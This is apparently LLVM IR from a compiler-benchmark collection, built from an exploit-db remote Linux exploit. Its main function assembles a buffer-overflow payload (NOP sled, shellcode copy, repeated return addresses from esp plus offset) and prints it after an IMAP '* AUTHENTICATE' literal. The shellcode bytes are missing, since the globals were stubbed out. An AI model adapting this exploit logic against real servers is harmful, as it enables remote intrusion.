; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19107.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19107.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [26 x i8] c"usage: %s nop esp offset\0A\00", align 1
@nop = common dso_local global i32 0, align 4
@esp = common dso_local global i32 0, align 4
@offset = common dso_local global i32 0, align 4
@buf = common dso_local global i32* null, align 8
@NOP = common dso_local global i32 0, align 4
@BUFLEN = common dso_local global i32 0, align 4
@shell = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [22 x i8] c"* AUTHENTICATE {%d}\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = icmp slt i32 %6, 4
  br i1 %7, label %8, label %13

8:                                                ; preds = %2
  %9 = load i8**, i8*** %4, align 8
  %10 = getelementptr inbounds i8*, i8** %9, i64 0
  %11 = load i8*, i8** %10, align 8
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0), i8* %11)
  br label %79

13:                                               ; preds = %2
  %14 = load i8**, i8*** %4, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 1
  %16 = load i8*, i8** %15, align 8
  %17 = call i8* @strtoul(i8* %16, i32* null, i32 0)
  %18 = ptrtoint i8* %17 to i32
  store i32 %18, i32* @nop, align 4
  %19 = load i8**, i8*** %4, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 2
  %21 = load i8*, i8** %20, align 8
  %22 = call i8* @strtoul(i8* %21, i32* null, i32 0)
  %23 = ptrtoint i8* %22 to i32
  store i32 %23, i32* @esp, align 4
  %24 = load i8**, i8*** %4, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @strtol(i8* %26, i32* null, i32 0)
  store i32 %27, i32* @offset, align 4
  %28 = load i32*, i32** @buf, align 8
  %29 = load i32, i32* @NOP, align 4
  %30 = load i32, i32* @BUFLEN, align 4
  %31 = call i32 @memset(i32* %28, i32 %29, i32 %30)
  %32 = load i32*, i32** @buf, align 8
  %33 = load i32, i32* @nop, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  %36 = load i32, i32* @shell, align 4
  %37 = load i32, i32* @shell, align 4
  %38 = call i32 @strlen(i32 %37)
  %39 = call i32 @memcpy(i32* %35, i32 %36, i32 %38)
  %40 = load i32, i32* @nop, align 4
  %41 = load i32, i32* @shell, align 4
  %42 = call i32 @strlen(i32 %41)
  %43 = add nsw i32 %40, %42
  store i32 %43, i32* %5, align 4
  br label %44

44:                                               ; preds = %57, %13
  %45 = load i32, i32* %5, align 4
  %46 = load i32, i32* @BUFLEN, align 4
  %47 = sub nsw i32 %46, 4
  %48 = icmp slt i32 %45, %47
  br i1 %48, label %49, label %60

49:                                               ; preds = %44
  %50 = load i32, i32* @esp, align 4
  %51 = load i32, i32* @offset, align 4
  %52 = add nsw i32 %50, %51
  %53 = load i32*, i32** @buf, align 8
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i32, i32* %53, i64 %55
  store i32 %52, i32* %56, align 4
  br label %57

57:                                               ; preds = %49
  %58 = load i32, i32* %5, align 4
  %59 = add nsw i32 %58, 4
  store i32 %59, i32* %5, align 4
  br label %44

60:                                               ; preds = %44
  %61 = load i32, i32* @BUFLEN, align 4
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0), i32 %61)
  store i32 0, i32* %5, align 4
  br label %63

63:                                               ; preds = %74, %60
  %64 = load i32, i32* %5, align 4
  %65 = load i32, i32* @BUFLEN, align 4
  %66 = icmp slt i32 %64, %65
  br i1 %66, label %67, label %77

67:                                               ; preds = %63
  %68 = load i32*, i32** @buf, align 8
  %69 = load i32, i32* %5, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i32, i32* %68, i64 %70
  %72 = load i32, i32* %71, align 4
  %73 = call i32 @putchar(i32 %72)
  br label %74

74:                                               ; preds = %67
  %75 = load i32, i32* %5, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %5, align 4
  br label %63

77:                                               ; preds = %63
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  br label %79

79:                                               ; preds = %77, %8
  ret void
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @strtoul(i8*, i32*, i32) #1

declare dso_local i32 @strtol(i8*, i32*, i32) #1

declare dso_local i32 @memset(i32*, i32, i32) #1

declare dso_local i32 @memcpy(i32*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @putchar(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
